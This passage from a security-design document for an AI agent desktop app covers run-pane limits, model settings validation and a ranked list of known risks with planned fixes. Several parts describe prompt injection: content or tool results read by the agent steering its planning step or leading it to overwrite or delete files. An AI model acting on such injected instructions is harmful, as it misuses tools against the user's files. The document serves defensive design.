  isn't trusted (copied into `loops/` by hand, or after the list was reset);
  and importing a loop configuration whose result isn't a trusted loop (new
  settings can rewrite prompts), with a table of what changes.
- **Limits of this.** The scan finds patterns; a model can still be steered
  by harmless-looking prompts or by content it reads, and a loop can behave
  differently later (a branch on memory, or on a web page it reads). Settings
  changed in Agent Loop Configuration by hand, and test runs in the editor,
  aren't reviewed (they're the user's own edits).

## The run pane (after v0.1.2)

- **Pane output** is display only: it can't reach files, tools, the
  network or the reply. Its lines are model or loop text, so the pane
  shows them as plain text (Svelte escapes them; no Markdown or links),
  folded to one line and cut at 1,000 characters, and a run keeps at most
  500 lines in memory (never on disk, apart from the block's input in the
  run log like any other step).
- `run_pane` returns only those lines for a run id and is allowed in the
  main window only.
- The Chummy assistant's *Decide what's next* call is an ordinary model
  call inside the loop (no tools, counted in the daily budget and the
  loop's limits), so the "your model, your call" rule holds. Its step goes
  back to Work as `{{next}}` (system message and the Reminder sent last),
  which a prompt injection in tool results could steer; that's no more
  than the model reading those results directly, and tool permissions and
  approvals still apply. The Reminder is marked as the agent's own
  planning, not the user's words.

## Generation settings and per-agent model settings

- New settings on model connections (reasoning effort, sampling,
  penalties, seed, stop sequences) and an agent's overrides of them only
  change how the model answers; none touch tools, files, the network or
  budgets. They're validated in Rust (ranges, at most 4 stop sequences of
  1–100 characters) and only those a kind of server accepts are sent.
- The address, key, context length, Make room at, daily limit and Use
  model within app stay per connection only; an agent can't change them.
- An agent's changes are logged to the system log ("model settings
  changed") like its other settings.

## Known risks and what to do next

In rough order of importance:

1. **Prompt injection inside the agent's folder.** Content the model reads
   can still steer it to misuse tools that don't go online, for example
   overwriting or deleting files in its folder with write tools. Today's
   mitigations are the jail and per-tool **Ask me before each use**.
   Per-agent tool lists (pass 6) let an agent that reads untrusted files
   have no write tool. *Next:* a one-click "undo this run" that snapshots
   files before a job changes them.
2. **Your model provider sees everything the agent reads.** With a cloud
   model, workspace files sent to the model leave your computer. *Next:*
   label connections as "on this computer", "on your network" or "in the
   cloud" wherever a model is chosen.
3. **Malware running as you** can change `settings.json` (for example, turn
   internet access on) without a confirmation. *Next:* protect settings
   with a MAC keyed by a secret in the keychain, and reset permissions to
   off if it doesn't match.
4. **Trays that can't be seen.** On Linux desktops without a tray host (for
   example GNOME without the AppIndicator extension), the tray icon can be
   created but not shown, so **Keep running in tray** hides Chummy with no
   visible icon. Opening Chummy again brings the window back. *Next:* check
   for a StatusNotifier host and offer "minimize" instead.
5. **Unsigned releases.** Release builds aren't code-signed or notarized
   yet, so people can't verify what they install. *Next:* signing on all
   three OSes, published checksums, and an updater that checks signatures.
6. **Cost.** A repeating job with a paid model can add up. Daily token
   limits (pass 6) cap it per connection, and the Scheduler shows about how
   many runs a day a schedule makes. Token counts are what the server
   reports, or an estimate when it reports nothing. *Next:* limits in money
   for providers with known prices.
7. **No record of exactly what tools sent.** Run logs show every tool
   call's arguments and result, and the system log every tool run, but not
   each web request a tool made. *Next:* log each request's address.
8. **History is plain text.** Chats and job histories are stored unencrypted
   in the Chummy folder, protected only by OS permissions (run logs are
   encrypted since pass 8). *Next:* encrypt chat and job history with the
   same key. Full-disk encryption is recommended.

chummyd, the planned background service, raises the stakes (a listening
API, remote answers, unattended hosts). Its own security design is in
[roadmap](roadmap.md#chummyd-the-background-job-service).
